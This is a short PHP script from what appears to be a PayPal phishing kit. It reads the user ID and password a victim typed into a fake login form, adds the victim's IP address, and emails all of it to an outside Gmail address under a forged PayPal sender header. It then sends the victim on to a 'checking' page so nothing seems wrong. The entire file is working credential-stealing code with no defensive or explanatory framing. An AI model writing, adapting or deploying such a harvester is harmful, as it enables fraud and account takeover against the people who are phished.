<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Paypal Info-----------------------\n";
$message .= "User Id             : ".$_POST['formtext1']."\n";
$message .= "Password             : ".$_POST['formtext2']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY Unknown-------------\n";
$send = "fudtools@gmail.com";
$subject = "Result from Unknown";
$headers = "From: Paypal<customer-support@mrs>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
		   header("Location: checking.html");

	 
?>